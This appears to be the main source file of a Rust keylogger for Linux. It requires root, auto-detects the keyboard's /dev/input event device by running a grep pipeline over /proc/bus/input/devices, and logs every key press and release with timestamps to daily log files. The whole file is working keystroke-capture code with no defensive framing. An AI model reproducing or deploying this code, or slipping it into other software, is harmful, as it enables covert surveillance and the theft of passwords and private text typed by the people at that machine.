extern crate getopts;
extern crate env_logger;
extern crate libc;
extern crate chrono;
#[macro_use]
extern crate log;

mod input;

use std::process::{exit, Command};
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;
use std::{env, mem};
use getopts::Options;
use chrono::{NaiveDateTime, DateTime, Datelike, Timelike, Local, Utc};
use input::{is_key_event, is_key_press, is_key_release, is_shift, get_key_text, InputEvent};

const VERSION: &'static str = env!("CARGO_PKG_VERSION");

#[derive(Debug)]
struct Config {
    device_file: String,
    log_file: Option<String>
}

impl Config {
    fn new(device_file: String, log_file: Option<String>) -> Self {
        Config {
            device_file,
            log_file
        }
    }
}

fn main() {
    root_check();

    env_logger::init();

    let config = parse_args();
    debug!("Config: {:?}", config);

    let log_name = log_name_from(&Local::now());
    let mut log_file = if let Some(ref name) = config.log_file {
        open_log_file(name)
    } else {
        open_log_file(&log_name)
    };
    let mut device_file = File::open(&config.device_file)
        .expect("Can't open device file");

    // TODO: use the sizeof function (not available yet) instead of hard-coding 24.
    let mut buf: [u8; 24] = unsafe { mem::zeroed() };

    // We use a u8 here instead of a bool to handle the rare case when both shift keys are pressed
    // and then one is released
    let mut shift_pressed = 0;
    loop {
        let num_bytes = device_file.read(&mut buf)
            .expect("Can't read from device file");
        if num_bytes != mem::size_of::<InputEvent>() {
            panic!("Error while reading from device file");
        }
        let event: InputEvent = unsafe { mem::transmute(buf) };
        if is_key_event(event.type_) {
            let event_mark = if is_key_press(event.value) {
                if is_shift(event.code) {
                    shift_pressed += 1;
                }
                "PR"
            } else if is_key_release(event.value) {
                if is_shift(event.code) {
                    shift_pressed -= 1;
                }
                "RE"
            } else {
                continue;
            };

            let datetime = convert_time(event.tv_sec, event.tv_usec);
            let time = datetime.hour() * 60 * 60 * 1000 + datetime.minute() * 60 * 1000 + datetime.second() * 1000 + datetime.nanosecond() / 1_000_000;
            let text = format!(
                "{:08} {} {}\n",
                time, event_mark, get_key_text(event.code, shift_pressed)
            );

            if config.log_file.is_none() {
                let current_log_name = log_name_from(&datetime);
                if log_name != current_log_name {
                    log_file = open_log_file(current_log_name);
                }
            }

            let num_bytes = log_file.write(text.as_bytes())
                .expect("Can't write to log file");
            if num_bytes != text.len() {
                panic!("Error while writing to log file");
            }
        }
    }
}

fn open_log_file<P: AsRef<Path>>(name: P) -> File {
    OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open(name)
        .expect("Can't open log file")
}

fn root_check() {
    let euid = unsafe { libc::geteuid() };
    if euid != 0 {
        panic!("Must run as root user");
    }
}

fn log_name_from(datetime: &DateTime<Local>) -> String {
    format!("{:04}-{:02}-{:02}.log", datetime.year(), datetime.month(), datetime.day())
}

fn convert_time(secs: isize, micros: isize) -> DateTime<Local> {
    let naive_datetime = NaiveDateTime::from_timestamp(secs as i64, micros as u32 * 1000);
    DateTime::<Utc>::from_utc(naive_datetime, Utc).with_timezone(&Local)
}

fn parse_args() -> Config {
    fn print_usage(program: &str, opts: Options) {
        let brief = format!("Usage: {} [options]", program);
        println!("{}", opts.usage(&brief));
    }

    let args: Vec<_> = env::args().collect();

    let mut opts = Options::new();
    opts.optflag("h", "help", "prints this help message");
    opts.optflag("v", "version", "prints the version");
    opts.optopt("d", "device", "specify the device file", "DEVICE");
    opts.optopt("f", "file", "specify the file to log to", "FILE");

    let matches = opts.parse(&args[1..])
        .expect("Can't parse options");
    if matches.opt_present("h") {
        print_usage(&args[0], opts);
        exit(0);
    }

    if matches.opt_present("v") {
        println!("{}", VERSION);
        exit(0);
    }

    let device_file = matches.opt_str("d").unwrap_or_else(|| get_default_device());
    let log_file = matches.opt_str("f");

    Config::new(device_file, log_file)
}

fn get_default_device() -> String {
    let mut filenames = get_keyboard_device_filenames();
    debug!("Detected devices: {:?}", filenames);

    if filenames.len() == 1 {
        filenames.swap_remove(0)
    } else {
        panic!("The following keyboard devices were detected: {:?}. Please select one using \
                the `-d` flag", filenames);
    }
}

// Detects and returns the name of the keyboard device file. This function uses
// the fact that all device information is shown in /proc/bus/input/devices and
// the keyboard device file should always have an EV of 120013
fn get_keyboard_device_filenames() -> Vec<String> {
    let mut command_str = "grep -E 'Handlers|EV' /proc/bus/input/devices".to_string();
    command_str.push_str("| grep -B1 120013");
    command_str.push_str("| grep -Eo event[0-9]+");

    let res = Command::new("sh")
        .arg("-c")
        .arg(command_str)
        .output()
        .expect("Can't get keyboard device filenames");
    let res_str = std::str::from_utf8(&res.stdout).unwrap();

    let mut filenames = Vec::new();
    for file in res_str.trim().split('\n') {
        let mut filename = "/dev/input/".to_string();
        filename.push_str(file);
        filenames.push(filename);
    }
    filenames
}
